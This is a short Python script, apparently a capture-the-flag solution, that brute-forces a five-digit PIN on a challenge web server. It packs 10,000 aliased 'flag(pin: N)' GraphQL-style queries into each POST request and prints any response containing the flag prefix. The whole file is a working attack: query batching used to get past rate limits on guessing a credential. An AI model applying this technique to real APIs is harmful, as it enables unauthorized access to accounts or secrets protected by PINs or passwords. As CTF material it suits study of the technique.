import requests
import json


def main():
    url = "https://web-force-force-e9457753573288eb.be.ax"
    headers = {
        "Content-Type" : "text/plain;charset=UTF-8"
    }
    for i in range(10):
        data = {}
        for j in range(i*10**4,i*10**4+10**4):
            data["t" + str(j)] = "flag(pin: {})".format(str(j))

        data = json.dumps(data).replace("\"","")
        r = requests.post(url=url,data=data,headers=headers)
        ans = json.loads(r.text)
        ans1 = ans["data"]
        for i in ans1.values():
            if "cor" in i:
                print(i)
                print(r.text)

if __name__ == "__main__":
    main()
